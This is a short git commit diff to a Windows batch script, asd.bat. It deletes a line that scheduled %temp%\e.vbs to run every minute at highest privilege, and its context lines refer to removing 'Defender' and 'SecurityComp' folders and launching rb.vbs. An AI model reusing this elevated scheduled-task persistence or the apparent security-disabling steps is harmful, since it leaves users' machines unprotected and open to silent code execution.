912562dc307eb512cb37cd390ed223af88bb2514
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-07 11:06:43 +0300

    Update asd.bat

--- asd.bat
+++ asd.bat
@@ -55,7 +55,6 @@ rmdir /s /q "Remove_SecurityComp"
 rmdir /s /q "Remove_Defender"
 
 
-schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
 timeout /t 5
 start rb.vbs
 
